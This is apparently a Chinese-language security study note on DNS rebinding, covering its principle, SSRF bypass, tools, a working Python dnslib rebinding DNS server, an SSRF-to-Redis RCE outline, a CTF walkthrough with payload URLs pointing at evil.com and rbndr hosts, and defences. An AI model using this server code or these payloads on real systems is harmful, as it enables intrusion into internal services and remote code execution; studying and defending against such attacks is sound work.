# DNS rebinding 攻击

## 一句话理解
DNS Rebinding 的核心，是让同一个攻击者控制的域名在不同时间解析到不同 IP，从而诱导浏览器或服务端先通过安全校验，再转而访问内网或本地敏感地址。

## 核心原理
一次典型流程通常是：
1. 受害者访问攻击者控制的域名
2. 域名最初解析到公网 IP，顺利通过校验或建立页面上下文
3. 在极短 TTL 或再次解析后，同一域名被重绑定到内网 / 回环地址
4. 浏览器或服务端继续信任这个域名，转而访问本地或内网服务

## 常见攻击对象
- 浏览器侧内网探测
- 绕过基于域名的访问控制
- 绕过 SSRF IP 校验
- 访问仅内网开放的管理接口
- 攻击本地开发服务、调试端口、Docker API、K8s API 等

## 常见成立条件
- 攻击者可控制域名解析
- 业务或浏览器会对目标域名进行多次解析
- 目标只校验域名或首个解析结果
- TTL 足够低，或解析缓存可控

## 与 SSRF 的关系
DNS Rebinding 常被用作 SSRF 绕过手段。  
典型场景是：
- 业务先检查域名解析结果是否为公网
- 通过校验后，再次发请求时解析成内网地址

这也是很多 SSRF 过滤规则最容易被绕过的点之一。

## 浏览器侧风险
在浏览器侧，攻击者页面一旦与自身域名建立同源关系，就可能在解析结果改变后继续对“同域名下的新 IP”发起请求，从而打内网服务。

重点影响：
- 本地管理面板
- 路由器、NAS、摄像头等设备
- 开发环境服务
- 内网 Web 管理接口

## 服务端风险
在服务端场景中，DNS Rebinding 常用于绕过：
- IP 白名单
- 内外网判断
- “禁止访问 127.0.0.1 / 10.x / 192.168.x.x” 这类简单限制

## 工具与平台

### 1. rbndr（零部署，开箱即用）
[taviso/rbndr](https://github.com/taviso/rbndr) 提供的公共 rebinding 域名，把两个 IP 编进子域名，每次解析**随机返回其中一个**：

```text
# 格式：<IP1>.<IP2>.rbndr.us，IP 支持十六进制等常见写法（7f000001 即 127.0.0.1）
7f000001.8.8.8.8.rbndr.us
# 8.8.8.8 也可写成十六进制 08080808：
7f000001.08080808.rbndr.us
# 每次查询随机返回 8.8.8.8 或 127.0.0.1，TTL 为 1s
```

用法：把该域名填进 SSRF 参数，多次请求直到命中"第一次解析（校验）拿到 8.8.8.8、第二次解析（连接）拿到 127.0.0.1"的顺序。先用 dig 验证轮询行为：

```bash
# 连续查询，观察两次结果是否交替/随机
dig +short 7f000001.8.8.8.8.rbndr.us
dig +short 7f000001.8.8.8.8.rbndr.us
```

### 2. rebind.network
类似的公共服务，提供随机 / 可配置的 rebinding 域名，免去自建，适合快速验证。

### 3. 自建：dnsmasq / BIND 极短 TTL 轮换
公共服务不可控（随机顺序）时自建 DNS，**按序返回**更稳：

```bash
# dnsmasq 思路：TTL 压到 1s + 定时切换 A 记录
# /etc/dnsmasq.conf
local-ttl=1
address=/rebind.evil.com/1.2.3.4
# 配合脚本每 N 秒把上面这行在 1.2.3.4 与 127.0.0.1 之间切换后 reload
```

BIND 思路：用 `nsupdate` 动态更新 A 记录（先 1.2.3.4 后 127.0.0.1），TTL 设 1。核心是 **TTL≤1 且链路上无强制缓存层**。

### 4. 自写脚本：Python + dnslib 最小实现
状态可控、能"按序"返回，比随机轮询命中率高：

```python
# 最小思路：dnslib 起一个权威 DNS，按解析次数交替返回两个 IP
from dnslib import RR, A
from dnslib.server import DNSServer, BaseResolver

class RebindResolver(BaseResolver):
    def __init__(self, a='1.2.3.4', b='127.0.0.1'):
        self.a, self.b = a, b   # a: 外网 IP（过校验用）  b: 内网 IP（真正访问）
        self.n = 0

    def resolve(self, request, handler):
        self.n += 1
        ip = self.a if self.n % 2 == 1 else self.b   # 第一次返回 a，第二次返回 b
        reply = request.reply()
        reply.add_answer(RR(request.q.qname, ttl=1, rdata=A(ip)))
        return reply

resolver = RebindResolver()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start()
# 部署要点：域名 NS 指向本机、防火墙放行 53/UDP、ttl=1 防上游缓存
```

## 攻击流程演示：SSRF + Rebinding 打内网 Redis

**前置条件**：目标站 `http://target/fetch?url=` 存在 SSRF；服务端逻辑为"先解析域名校验 IP 是否公网，通过后再发起真实请求"（即存在**两次解析**）。

### 请求时序表

| 步骤 | 时刻 | DNS 解析结果 | 服务端动作 | 结果 |
| --- | --- | --- | --- | --- |
| 0 | T0 | — | 攻击者提交 `url=http://rebind.evil.com:6379/info` | 进入校验流程 |
| 1 | T1 | `1.2.3.4`（外网 IP） | 第一次解析做 IP 校验："是公网 IP，放行" | 校验通过 |
| 2 | T2 | `127.0.0.1`（TTL=1 已过期） | 发起真实请求前再次解析，拿到内网 IP | 连接到 127.0.0.1:6379 |
| 3 | T2+ | — | HTTP 请求直落 Redis 端口 | Redis 收到畸形命令但可注入 |
| 4 | T3 | — | 换 gopher:// payload 下发 RESP 命令 | 写 webshell / 计划任务 → RCE |

### 关键细节

- **两次解析是前提**：若目标"校验与连接共用同一次解析"（DNS 结果缓存在变量里），rebinding 无效——先确认目标确实会多次解析（观察两次解析时机、或响应差异）
- **TTL 必须 ≤1**：上游 DNS、系统缓存（如 systemd-resolved、Java 的 `networkaddress.cache.ttl`）都可能让第二次解析拿到旧结果；TTL 设 0/1，并确认链路上无强制缓存
- **随机 vs 按序**：rbndr 是随机 50/50，要撞运气多次提交；自建 dnslib 脚本"第一次必给外网、第二次必给内网"，一次成功
- **Redis 侧利用**：HTTP 请求行会被 Redis 当错误命令丢弃，但后续注入的 RESP 指令照常执行；无 gopher 支持时改用 CRLF 注入拼命令（详见 [EXP-CRLF](./EXP-CRLF.md) 的 Redis 联动小节）

## 案例：一道 SSRF + DNS Rebinding CTF 题流程

**题目背景**：`http://chall/fetch?url=` 可让服务端代取 URL，flag 位于 `http://127.0.0.1:5000/flag` 的内网服务上，目标绕过 IP 校验。

**Step 1 直连试探**：

```text
/fetch?url=http://127.0.0.1:5000/flag
→ "forbidden: private ip"
```

服务端对字面 IP 做了黑名单（127/8、10/8、172.16-31、192.168/16、169.254/16）。

**Step 2 进制绕过试探**：

```text
/fetch?url=http://2130706433:5000/flag     # 127.0.0.1 的十进制整数
/fetch?url=http://0x7f.1:5000/flag          # 十六进制混合写法
→ 同样被拦
```

进制花活失效，说明黑名单在**解析成 IP 之后**判断——只能靠"两次解析结果不同"绕过。

**Step 3 302 跳转试探**：

```text
/fetch?url=http://evil.com/r.php            # r.php 返回 302 Location: http://127.0.0.1:5000/flag
→ "forbidden: private ip"
```

应用跟随跳转时也会校验目标 IP，302 绕过失效。但注意：跳转目标是被**再解析**后校验的，说明应用确实存在多次解析——rebinding 有戏。

**Step 4 DNS Rebinding 收割**：

```text
# 方案 A：公共 rbndr（随机轮询，多提交几次直到命中正确顺序）
/fetch?url=http://7f000001.08080808.rbndr.us:5000/flag

# 方案 B：自建 dnslib 按序返回（第一次 1.2.3.4 / 第二次 127.0.0.1，一次成功）
/fetch?url=http://rebind.evil.com:5000/flag
```

- 第一次解析（校验）→ `1.2.3.4`，公网 IP，放行
- 第二次解析（连接）→ `127.0.0.1`，请求直达 flag 服务

**Step 5 拿到结果**：

```text
→ {"flag": "flag{dns_reb1nd1ng_byp4ss}"}
```

**复盘要点**：
- 第一步永远是判断"校验与连接是否分离"（见上文排查思路）
- 进制绕过失效不是坏消息——它反而证明校验发生在解析之后，rebinding 正是对症下药
- TTL / 缓存是主要失败原因：内网存在 DNS 缓存层时，改用 TTL=0 + 每次随机子域名（`<random>.rebind.evil.com`）强制回源解析

## 常见排查思路
### 1. 看校验与请求是否分离
如果业务是：
- 先校验 URL / 域名
- 再发起实际请求

就要重点关注是否存在两次解析差异。

### 2. 看是否只校验域名或首个 IP
常见错误：
- 只做字符串校验
- 只在第一次解析时判断 IP 是否内网
- 不校验重定向后的目标
- 不校验最终连接的目标地址

### 3. 看缓存和 TTL
DNS 缓存、代理缓存、应用层缓存都会影响利用稳定性。

## 常见防御误区
- 只判断域名是否在白名单
- 只在接收参数时解析一次
- 只判断 `A` 记录，不考虑其他解析细节
- 未校验最终建立连接的 IP

## 防御要点
### 1. 校验最终连接目标
不要只校验域名，应校验实际连接到的最终 IP 是否属于受信范围。

### 2. 限制内网地址
明确禁止访问：
- 回环地址
- 私有地址
- 链路本地地址
- 云元数据地址

### 3. 固定解析或服务端自建映射
对高风险业务，优先使用可信解析结果，而不是直接信任用户提供的域名。

### 4. 网络层隔离
就算业务逻辑出错，也要尽量让应用侧无法访问关键内网管理面。

## 速查清单
- 先看域名校验和实际请求是否分两步
- 先看是否只校验首个解析结果
- 重点评估 SSRF 绕过、浏览器打内网和本地管理接口风险
- 关注 TTL、缓存、重定向和最终连接目标
- 不要把 DNS Rebinding 当成纯浏览器问题，它也常出现在服务端逻辑里

## Reference
- [从 0 到 1 认识 DNS 重绑定攻击](https://xz.aliyun.com/t/7495)
- [taviso/rbndr - DNS Rebinding 服务（GitHub）](https://github.com/taviso/rbndr)
- [rebind.network - 可配置 rebinding 服务](https://rebind.network)
- [Stanford - Protecting Browsers from DNS Rebinding Attacks（经典论文，SISL 项目页）](https://crypto.stanford.edu/dns/)
- [tobyh.com/research - DNS Rebinding 相关研究](https://tobyh.com/research/)
